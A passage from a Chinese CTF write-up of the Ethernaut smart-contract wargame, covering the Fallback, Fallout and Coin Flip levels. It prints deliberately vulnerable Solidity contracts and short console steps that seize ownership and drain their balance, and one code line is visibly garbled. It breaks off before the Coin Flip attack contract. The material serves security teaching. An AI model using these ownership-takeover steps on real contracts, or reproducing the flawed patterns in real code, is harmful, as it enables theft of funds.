## 前言
Ethernaut 是由 Zeppelin 开发并维护的一个平台，上面有很多包含了以太坊经典漏洞的合约，以类似 CTF 题目的方式呈现给我们，目前已有 19
个挑战。平台网址：
完成该项挑战需要一定的 solidity 语言基础，以及一点的 javascript 语法基础。如果对区块链没有任何基础，推荐根据教程快速学习
solidity 语法，比如 [CryptoZombies](https://cryptozombies.io/zh/) 等。
以及进行挑战需要安装 metamask，一款开源的以太坊钱包，尚未安装的话可以参考网上教程进行安装，这里不再赘述。另一个需要注意的是由于题目都部署在
Ropsten Test Network 上，所以记得去领取测试网络上免费发放的 ether，要不然连题都做不了 (￣_￣|||)
## Hello Ethernaut - 快速入门
让玩家简单熟悉关卡挑战的模式，以及执行操作的方式，根据其介绍的一步步进行操作即可通过本关。
操作如图：
## Fallback - 回退函数
首先简单介绍 fallback 函数的作用：
合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值。
如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（`fallback`
函数）会被执行。除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，`fallback` 函数必须标记为
`payable`。
然后我们看题目的源码：
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallback is Ownable {
      mapping(address => uint) public contributions;
      function Fallback() public {
        contributions[msg.sender] = 1000 * (1 ether);
      }
      function contribute() public payable {
        require(msg.value  contributions[owner]) {
          owner = msg.sender;
        }
      }
      function getContribution() public view returns (uint) {
        return contributions[msg.sender];
      }
      function withdraw() public onlyOwner {
        owner.transfer(this.balance);
      }
      function() payable public {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
    }
很明显该函数就是 `fallback` 函数：
    function() payable public {
      require(msg.value > 0 && contributions[msg.sender] > 0);
      owner = msg.sender;
    }
结合题目的要求：
  1. you claim ownership of the contract
  2. you reduce its balance to 0
很明显我们如果通过反复调用 `contribute` 来触发 owner 不现实，因为我们每次最多向合约贡献不大于 0.001 ether，而要超过
owner 需要 1000 ether（构造函数赋予 owner 的）。但我们惊喜地发现 `fallback` 函数同样可以改变 owner
的值，那么对应的操作就非常清晰了：
  1. 调用合约的 `contribute` 使得合约中我们账户对应的 balance 大于 0
  2. 触发 `fallback` 函数使得合约对应的 owner 变成我们
  3. 调用 `withdraw` 函数清空 balance
    // step 1
    await contract.contribute({value: 1});
    // step 2，使用 sendTransaction 函数触发 fallback 函数执行
    await contract.sendTransaction({value: 1});
    // step 3
    await contract.withdraw();
    // 此时调用 owner 函数可以确认合约的 owner 是否已经变成了我们所对应的地址了
    await contract.owner();
不得不说的是在智能合约相关的安全漏洞中，有很大一部分都与合约实例的回退函数有关，比如经典的 `Reentrancy（重入）`
漏洞，这个我们在后续的分析中再接着讨论。
## Fallout - 构造函数失控
第二题的要求和第一题一样：`Claim ownership of the contract below to complete this
level`，本题给了一个提示：`Solidity Remix IDE`
根据题目建议把题目源码贴到 IDE 上：
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallout is Ownable {
      mapping (address => uint) allocations;
      /* constructor */
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
      function allocate() public payable {
        allocations[msg.sender] += msg.value;
      }
      function sendAllocation(address allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(this.balance);
      }
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
在编辑器或者 IDE 中我们可以发现一个很明显的问题，理论上应该写成 `Fallout` 的构造函数被写成了
`Fal1out`，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。那么这道题就变得非常简单了：
    // 调用该函数，修改 owner
    await contract.Fal1out();
    // 可以确认是否修改成功
    await contract.owner();
题目到这里就结束了，本题的漏洞也非常之明显，一个很简单的编程 Bug，但是不是意味着完全没有任何的参考价值呢？当然不是，之所以有这道题目，背后是有故事的：
ETH 圈的某家公司将公司名从 _Dynamic Pyramid_ 改为了 _Rubixi_
，但他们只修改了合约的名字而忘记修改构造函数的名字，结果就恰好发生了像本题所示的情况：所有人都能调用失控的构造函数！然后大家就开始了愉快的抢 owner
游戏（笑
    contract Rubixi {
      address private owner;
      function DynamicPyramid() { owner = msg.sender; }
      function collectAllFees() { owner.transfer(this.balance) }
      ...
    }
幸好在 solidity 0.4.22 版本的编译器中已经基本解决了该问题，该版本引入了关键词 `constructor`
来指定构造函数，而不是之前版本的函数的名称与合约名称匹配，所以就不会发生只修改合约名但忘记修改构造函数名这种奇怪的情况了。
## Coin Flip - 不安全的随机数
本题的要求是猜对 10 次硬币（10 次 0 或 1），可以看到代码如下：
    pragma solidity ^0.4.18;
    contract CoinFlip {
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      function CoinFlip() public {
        consecutiveWins = 0;
      }
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        if (lastHash == blockValue) {
          revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
可以看到函数的随机数产生逻辑如下：
  1. 获得上一块的 hash 值
  2. 判断与之前保存的 hash 值是否相等，相等则回退
  3. 根据 blockValue / FACTOR 的值判断为正或负，即通过 hash 的首位判断
所以我们可以看到我们每次产生的随机数只与当前块的前一块的 hash
值有关，而这可以近似看成随机的。但这是不是意味着我们无法预测呢？当然不是，我们同样可以得到题目用来计算随机数的所有信息（`block.number`，`block.blockhash(xxx)`
等），所以我们也可以得到相应的随机数具体是多少。唯一的问题在于以太坊 10s 左右产生一个
block，所以我们用手动调用的方式可能来不及，所以需要编写合约进行调用：